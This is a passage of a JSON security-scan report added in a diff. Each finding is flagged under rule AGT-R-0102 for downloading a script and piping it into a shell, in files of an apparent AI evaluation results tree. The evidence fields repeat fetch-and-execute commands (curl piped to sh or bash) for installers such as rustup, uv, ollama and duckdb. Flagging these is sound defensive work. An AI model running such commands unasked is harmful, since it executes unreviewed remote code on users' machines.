+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/blind/answers-A/picks-corrections.json",
+      "line": 458,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "e533c52d2303044071eceaa4f09314f70f1469f01f0eeb52e4a819b2e3278735"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/blind/answers-A/picks.csv",
+      "line": 2,
+      "evidence": "curl https://install.duckdb.org | sh",
+      "file_sha256": "ff9297c7e5596cda608c868680315da9d386e0ae8fe80cbe37c8aad2c72fac4e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/blind/answers-A/picks-extract.jsonl",
+      "line": 4,
+      "evidence": "curl https://install.duckdb.org | sh",
+      "file_sha256": "a7f77d9e983d9efe2aacb374f3d0aa5e2eac2b38c2bf105ae36de9e333bf6639"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/blind/prefer-run1/prefer-form.html",
+      "line": 57,
+      "evidence": "curl \\| bash",
+      "file_sha256": "cb0c65de468995614da594a98f41072e3fb28d8f7793009e25f68b4185da6dfd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/blind/prefer-run1/prefer-form.json",
+      "line": 11,
+      "evidence": "curl \\\\| bash",
+      "file_sha256": "eae1ce18f04612bc21ca9a04fc72d35e8d59073b915efd05f78759fddd9dabe7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/l2/q02-control/console.log",
+      "line": 3,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "file_sha256": "cebcb6552123d75cd16a807e994f1ba221b584ae0e282957e6c1168a5c9ffe51"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/l2/q02-control/steps.txt",
+      "line": 1,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "file_sha256": "7e511e3e534a906c426ccb6baaa94e31c041edf2252332cd230671cdba815b37"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/l2/scripts/q17-control.sh",
+      "line": 29,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "f76f9e1bdfb1c7255d25aa73ba97daeb95d06a9f4542a819524fa829ee6970ef"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/l2/scripts/q16-control.sh",
+      "line": 28,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "79bea357f21a1b29e2b81aa08efd2877354b362b2cf080d121daa87e62018cc6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/l2/scripts/q12.py",
+      "line": 35,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "566f8ceab91181cbf3f003f0190fb7947995705d2c1b16b0428847bf0fd43346"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/l2/scripts/q02-control.sh",
+      "line": 30,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "file_sha256": "e119db785b908f8f000795936e57a669cd07f0423f9007ce3be00fe1909a2a5a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/l2/q17-control/console.log",
+      "line": 3,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "c78d2d37f00f4835d1d00647f6e0962ba792dabf1722acff16e93fee7755d20b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/l2/q17-control/steps.txt",
+      "line": 1,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "b59b57537e93b409f851dcfb9bb16011ff36212f198034f37af442be05f7e843"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/l2/l2-results.json",
+      "line": 302,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "a9502a0a015b5435ad5e52ba5015f8c13d806988112c5676716f8173028468de"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/l2/mac-steps.md",
+      "line": 139,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "fd99633be9f25c260d5d66e7d5e08bf2475f6e4dd113221543eccdfd68547d3d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/l2/q12-control/steps.json",
+      "line": 112,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "6210ab91672478706f473fa40fd0e29f3b2ebfc3544c8abafe05fcdb35ff14ae"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/l2/q16-control/console.log",
+      "line": 1,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "1fadb86a6c6af8720f0a7521fb7e8716a9d2a1a5d4517545a876d65443087f2a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/l2/q16-control/steps.txt",
+      "line": 1,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "f55234499fa995a0802d3316ec394c994e5c3901581de54e791d9c7b44f42610"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run1/q16/control/attempt-1/answer.md",
+      "line": 14,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "f2dd1db0e03892a3e1c0d92e807c47404213646b058dc368b3c890b2517ba375"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run1/q16/control/attempt-1/stream.jsonl",
+      "line": 40,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "77691ee6750af4a33c79a74443248b32bb3587d0d25b49aee553d689cc991d85"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run1/q02/experimental/attempt-1/answer.md",
+      "line": 14,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "file_sha256": "ad883b525d32c7c5aedd8028c0c3a623d766bf64e368f133110b9fe09cd88159"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run1/q02/experimental/attempt-1/stream.jsonl",
+      "line": 23,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "file_sha256": "008c10ebbbddc5826c456c02b287e51ed5a680b7882ac882700e85a20e78e310"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run1/q02/control/attempt-1/answer.md",
+      "line": 11,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "file_sha256": "f60bbfd044a3520b9b8ca95190081f1950ea72f0cf957e28f5eaf0ff58e5addf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run1/q02/control/attempt-1/stream.jsonl",
+      "line": 19,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "file_sha256": "9f5c43d2068f857aaa7da916694387706415df25f6f165ad4b7f76f611e07557"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run1/q17/rules_only/attempt-1/answer.md",
+      "line": 22,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "795c673a4687a376a807e49371ed6cfbbf9f7ef74ad3c938c9c17baa6ee75d4c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run1/q17/rules_only/attempt-1/stream.jsonl",
+      "line": 24,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "10e31d1a15eb5b3d5cc65c4dcce275377451a7e8f41b68f51b5687ee757b43a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run1/q17/control/attempt-1/answer.md",
+      "line": 12,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "39c8d940d3d605354c6d39355f793f2067690755fec6b1abf91669d5d24d3bcb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run1/q17/control/attempt-1/stream.jsonl",
+      "line": 16,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "2a144d8062d769025c067545ff88048f2107a22bf16d6592cd18cc3e339959bb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run1/q01/control/attempt-1/answer.md",
+      "line": 43,
+      "evidence": "curl \\| bash",
+      "file_sha256": "fe13074aebde3a5cb6b1d12b67b1762dca9f3ac6b758235bafcf2fb10623c78e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run1/q01/control/attempt-1/stream.jsonl",
+      "line": 42,
+      "evidence": "curl \\\\| bash",
+      "file_sha256": "4ed117fe78f2a727df2f1e2fcc6afe4be8b331d9351f6a4b598f7be79324215d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run1/q03/experimental/attempt-1/answer.md",
+      "line": 17,
+      "evidence": "curl https://install.duckdb.org | sh",
+      "file_sha256": "a4f5bd6e7c9e903522a10fc2f1f94c44684eb61f9120e8757e4c2e4ea00e1f75"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run1/q03/experimental/attempt-1/stream.jsonl",
+      "line": 15,
+      "evidence": "curl https://install.duckdb.org | sh",
+      "file_sha256": "40d361142a84e29fdb915d1ad10246f8c9bddb63ff8f29e988cfc005dfa38e52"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run1/q09/rules_only/attempt-1/stream.jsonl",
+      "line": 13,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/steveyegge/beads/main/scripts/insta",
+      "file_sha256": "5eaad358dc9a15a8e2ef840d7401650cb10b4c05acdb8e2ca408b8e7326b8df9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run1/q12/control/attempt-1/answer.md",
+      "line": 13,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "c995bc2e1982c954d15adf97ba8305b555489cbd195f2b4532173ae0f0927a66"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run1/q12/control/attempt-1/stream.jsonl",
+      "line": 13,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "e453d753408cea21f3def16c4c71b3e5425d3b1c1eb497b07e23b7a99ecc9de3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run3/q16/control/attempt-1/answer.md",
+      "line": 16,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "23d8e4d03ec899a343435126fb5686c65e7690e6cb5c598d74d3ef487d1539a5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run3/q16/control/attempt-1/stream.jsonl",
+      "line": 70,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "20ae5e206804934cf9b134b111e865e0b9e66544a4b79b779660ea8c2e14d7c7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run3/q03/experimental/attempt-1/answer.md",
+      "line": 19,
+      "evidence": "curl https://install.duckdb.org | sh",
+      "file_sha256": "e3742c7be549f864c3e328e0f63a84fdbe4ab7e8b8e229a1f5e91718c96f7880"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run3/q03/experimental/attempt-1/stream.jsonl",
+      "line": 13,
+      "evidence": "curl https://install.duckdb.org | sh",
+      "file_sha256": "5a1c98cb05f9b6d3bd2d8eeb7029d7b0fb05811903d706d1620551edfa71d811"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run3/q03/control/attempt-1/answer.md",
+      "line": 13,
+      "evidence": "curl https://install.duckdb.org | sh",
+      "file_sha256": "267c2224c819210e1a68b82a49bc011076a9a76a547914d8d949761a4249f66e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run3/q03/control/attempt-1/stream.jsonl",
+      "line": 10,
+      "evidence": "curl https://install.duckdb.org | sh",
+      "file_sha256": "6527918dfc2ca431222b8d79baa82d9418be3eb98cb14fd898562404eeb2a378"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run3/q09/control/attempt-1/stream.jsonl",
+      "line": 14,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/gastownhall/beads/main/scripts/inst",
+      "file_sha256": "f6c7684b29d9ade087fcf699aee32f3a5e37b22edf069a6cb819255aa68a2696"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/bset/b12/control/attempt-1/answer.md",
+      "line": 30,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "6cd662e45e09660ed7f073bae32401b719aee4c41a706cd0e1091c733fc8a010"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/bset/b12/control/attempt-1/stream.jsonl",
+      "line": 22,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "34de262334968dbd0eba61270a8e867e9e8069b7aeb60b5697a96167fd5044d8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/bset/b10/experimental/attempt-1/answer.md",
+      "line": 28,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/iksnerd/adb-mcp/main/install.sh | s",
+      "file_sha256": "4d86e47e8b2d4397b378b2bb2ffc1132bd6a0ff9dec9f0623c59e66c880eaa20"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/bset/b10/experimental/attempt-1/stream.jsonl",
+      "line": 13,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/iksnerd/adb-mcp/main/install.sh | s",
+      "file_sha256": "165340ed1c1220b1e100f0ddbe85eaafc0695161e25f3abe340a0461829aca14"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/bset/b10/control/attempt-1/answer.md",
+      "line": 19,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/iksnerd/adb-mcp/main/install.sh | s",
+      "file_sha256": "e27d6b70953b0135b7691379831f694af949b76192dfa25234372d7623f99291"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/bset/b10/control/attempt-1/stream.jsonl",
+      "line": 14,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/iksnerd/adb-mcp/main/install.sh | s",
+      "file_sha256": "5b5e867dcbcf71b6851acea7e39b477e57dcdd789f19dde5132cf6304d53f5ed"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/bset/b03/control/attempt-1/answer.md",
+      "line": 18,
+      "evidence": "curl -sSf https://atlasgo.sh | sh",
+      "file_sha256": "05afd5c2b6ec5b62837573b4a40a2760f4d906a4e0157b75659eec38c824dd19"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/bset/b03/control/attempt-1/stream.jsonl",
+      "line": 31,
+      "evidence": "curl -sSf https://atlasgo.sh | sh",
+      "file_sha256": "50c7c4fdc4c7f4d43a5e68b64bcf94e05c08ffb26ec9fba6f964b452bbceef58"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/bset/b09/experimental/attempt-1/answer.md",
+      "line": 37,
+      "evidence": "curl -fsSL \"https://get.maestro.mobile.dev\" | bash",
+      "file_sha256": "6e98ff98bbd30af1b2b2b3835d823db792724291762a54442c81ab911c9ed709"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/bset/b09/experimental/attempt-1/stream.jsonl",
+      "line": 37,
+      "evidence": "curl -fsSL \\\"https://get.maestro.mobile.dev\\\" | bash",
+      "file_sha256": "f6a3298564ce288958864a0d2e18b65deaac8051a1b5d5b1876515171e161aaf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/bset/b09/control/attempt-1/answer.md",
+      "line": 31,
+      "evidence": "curl -Ls \"https://get.maestro.mobile.dev\" | bash",
+      "file_sha256": "43f40a06ccf63b00921821c535e981fd14d2082f5b3314fb07ef700bc27c63fa"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/bset/b09/control/attempt-1/stream.jsonl",
+      "line": 29,
+      "evidence": "curl -Ls \\\"https://get.maestro.mobile.dev\\\" | bash",
+      "file_sha256": "12df8a153769ea622956512bf701f2e38f352c01ac6d4c674c468398b9e629ed"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/voided/run1-experimental-20261102-094644/q02/experimental/attempt-1/answer.md",
+      "line": 20,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "file_sha256": "d246e492c44a9a35d7e2deaba4c290c17ba3c45baeab2cea5c6eac1096d0a503"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/voided/run1-experimental-20261102-094644/q02/experimental/attempt-1/stream.jsonl",
+      "line": 31,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "file_sha256": "aef644b5f9e2bc950098abff4494d8fb07b623d748f53d9ef4accb1516fd1da0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/voided/run1-control-20261102-094643/q01/control/attempt-1/stream.jsonl",
+      "line": 38,
+      "evidence": "curl ... install.sh | bash",
+      "file_sha256": "e20e4272a8ec90b88fcd2ea71b2b7e417b48f85934c1c036a31d47613c97fd86"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run2/q02/control/attempt-1/answer.md",
+      "line": 14,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "file_sha256": "c2f8627a98f0395c153e3c343c01b49e6464b1b1e5b221ffc077fe5861ac036e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run2/q02/control/attempt-1/stream.jsonl",
+      "line": 20,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "file_sha256": "8ba1c0383f71938436522a7fc4af79dfa6893d575fdc937a267d365156457238"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run2/q03/experimental/attempt-1/answer.md",
+      "line": 24,
+      "evidence": "curl … | sh",
+      "file_sha256": "9229194c52812d08fa755055691f9b49429e74d499bfe9933f5333bb6366749f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run2/q03/experimental/attempt-1/stream.jsonl",
+      "line": 16,
+      "evidence": "curl … | sh",
+      "file_sha256": "05e07a1a60f8329bf287cab714279d04b6445b20ab8afb53e30732cb10a6a0c9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run2/q03/control/attempt-1/answer.md",
+      "line": 11,
+      "evidence": "curl https://install.duckdb.org | sh",
+      "file_sha256": "cf8fc66cc5d147355ec7065f885482117f25b526ed2e8620d0e43e64f57758e8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/run2/q03/control/attempt-1/stream.jsonl",
+      "line": 11,
+      "evidence": "curl https://install.duckdb.org | sh",
+      "file_sha256": "37722566b1415681fe657367c2f6dab5ec431175d81911c0deabd484767157cb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/haiku/q16/control/attempt-1/answer.md",
+      "line": 30,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "0847d0df5993668a956f3aed8f3fcbec007a8f7a2c06010b4ee5da8c3c8c26eb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/runs/haiku/q16/control/attempt-1/stream.jsonl",
+      "line": 17,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "d8c43d9f9c874413e3c0d34798c57a44e35d7ac55618ce94b7dfb5dee5300198"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
